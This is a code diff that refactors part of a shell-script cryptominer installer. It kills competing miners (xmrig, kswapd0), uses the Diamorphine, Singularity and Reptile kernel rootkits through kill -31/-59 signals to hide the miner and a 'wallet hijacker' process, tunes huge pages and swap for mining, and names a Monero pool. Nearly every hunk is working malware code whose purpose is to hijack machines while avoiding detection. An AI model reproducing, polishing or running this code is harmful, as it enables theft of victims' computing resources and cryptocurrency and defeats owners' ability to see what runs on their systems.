@@ -221,7 +221,7 @@ echo "[*] Killing competitor miners..."
 killall -9 xmrig 2>/dev/null || true
 killall -9 kswapd0 2>/dev/null || true
 killall -9 swapd 2>/dev/null || true
-kill -9 $(ps aux | grep -E "swapd|kswapd0|xmrig" | grep -v grep | awk '{print $2}') 2>/dev/null || true
+kill -9 $(pgrep -f "swapd|kswapd0|xmrig") 2>/dev/null || true
 
 echo "[*] Removing immutable attributes from old installations..."
 # Remove immutable flags (chattr -i) before deletion
@@ -1677,9 +1677,9 @@ if lsmod | grep -q "^diamorphine" 2>/dev/null; then
     echo "[*] Diamorphine loaded — sending kill -31 (hide)..."
 
     kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
 
 
     echo "[✓] Processes hidden with Diamorphine (kill -31)"
@@ -1692,9 +1692,9 @@ if lsmod | grep -q "^rootkit" 2>/dev/null; then
     echo "[*] Crypto-Miner rootkit loaded — sending kill -31 (hide)..."
 
     kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
 
 
     echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
@@ -1707,9 +1707,9 @@ if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q "^singularity" 2>/dev/nul
     echo "[*] Singularity loaded — sending kill -59 (toggle hide)..."
 
     kill -59 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -59 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -59 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -59 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -59 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -59 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -59 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
 
     echo "[✓] Processes hidden with Singularity (kill -59)"
 else
@@ -1897,7 +1897,7 @@ HIJACKER_SERVICE_EOF
         fi
         
         # Verify it's hidden
-        if ps aux | grep "lightd.*daemon" | grep -v grep >/dev/null 2>&1; then
+        if pgrep -f "lightd.*daemon" >/dev/null 2>&1; then
             echo "[⚠] WARNING: lightd process still VISIBLE"
         else
             echo "[✓] lightd process successfully HIDDEN by kernel rootkits"
@@ -1970,11 +1970,11 @@ optimize_func() {
   fi
 
   echo "[*] Configuring huge pages..."
-  sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null || true
+  sysctl -w vm.nr_hugepages="$(nproc)" 2>/dev/null || true
 
-  for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d 2>/dev/null); do
+  while IFS= read -r i; do
     echo 3 >"$i/hugepages/hugepages-1048576kB/nr_hugepages" 2>/dev/null || true
-  done
+  done < <(find /sys/devices/system/node/node* -maxdepth 0 -type d 2>/dev/null)
 
   echo "[✓] 1GB huge pages enabled"
 }
@@ -1984,7 +1984,7 @@ if [ "$(id -u)" = 0 ]; then
   optimize_func
 else
   echo "[*] Not running as root - applying limited optimizations"
-  sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null || true
+  sysctl -w vm.nr_hugepages="$(nproc)" 2>/dev/null || true
 fi
 
 echo "[✓] CPU optimization complete"
@@ -1999,16 +1999,16 @@ echo ""
 echo "[*] Creating 2GB emergency swap to prevent OOM killer..."
 
 if [ ! -f /swapfile ]; then
-    dd if=/dev/zero of=/swapfile bs=1G count=2 2>/dev/null && {
+    if dd if=/dev/zero of=/swapfile bs=1G count=2 2>/dev/null; then
         chmod 600 /swapfile
         mkswap /swapfile 2>/dev/null
         swapon /swapfile 2>/dev/null
         echo "vm.swappiness=100" >> /etc/sysctl.conf 2>/dev/null || true
         sysctl -w vm.swappiness=100 2>/dev/null || true
         echo "[✓] 2GB swap created and activated"
-    } || {
+    else
         echo "[!] Failed to create swap file"
-    }
+    fi
 else
     echo "[*] Swap file already exists, activating..."
     swapon /swapfile 2>/dev/null || true
@@ -2055,9 +2055,9 @@ if lsmod | grep -q "^diamorphine" 2>/dev/null; then
     echo "[*] Diamorphine loaded — sending kill -31 (hide)..."
 
     kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
 
 
     echo "[✓] Processes hidden with Diamorphine (kill -31)"
@@ -2070,9 +2070,9 @@ if lsmod | grep -q "^rootkit" 2>/dev/null; then
     echo "[*] Crypto-Miner rootkit loaded — sending kill -31 (hide)..."
 
     kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -31 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -31 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
 
 
     echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
@@ -2085,9 +2085,9 @@ if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q "^singularity" 2>/dev/nul
     echo "[*] Singularity loaded — sending kill -59 (toggle hide)..."
 
     kill -59 $(pgrep -f -u root config.json) 2>/dev/null || true
-    kill -59 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -59 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
-    kill -59 `/bin/ps ax -fu $USER | grep "lightd"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -59 $(/bin/ps ax -fu "$USER" | grep "swapd"   | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -59 $(/bin/ps ax -fu "$USER" | grep "swapfile" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+    kill -59 $(/bin/ps ax -fu "$USER" | grep "lightd"  | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
 
     echo "[✓] Processes hidden with Singularity (kill -59)"
 else
@@ -2182,9 +2182,9 @@ echo '  Pool:    gulf.moneroocean.stream:80'
 
 echo ''
 echo 'Process Hiding Commands:'
-echo '  Singularity: kill -59 $PID  (kernel 6.x only)'
-echo '  Diamorphine: kill -31 $PID  (hide), kill -63 $PID (unhide)'
-echo '  Crypto-RK:   kill -31 $PID  (hide)'
+echo "  Singularity: kill -59 \$PID  (kernel 6.x only)"
+echo "  Diamorphine: kill -31 \$PID  (hide), kill -63 \$PID (unhide)"
+echo "  Crypto-RK:   kill -31 \$PID  (hide)"
 echo '  Reptile:     reptile_cmd hide'
 
 echo ''
@@ -2206,12 +2206,12 @@ echo ''
 # Check if processes are actually hidden
 PROCESSES_VISIBLE=false
 
-if ps aux | grep "swapd" | grep -v grep >/dev/null 2>&1; then
+if pgrep -x swapd >/dev/null 2>&1; then
     PROCESSES_VISIBLE=true
     echo '[⚠] WARNING: Miner processes are STILL VISIBLE in ps output!'
 fi
 
-if ps aux | grep "lightd.*daemon" | grep -v grep >/dev/null 2>&1; then
+if pgrep -f "lightd.*daemon" >/dev/null 2>&1; then
     PROCESSES_VISIBLE=true
     echo '[⚠] WARNING: Wallet hijacker is STILL VISIBLE in ps output!'
 fi
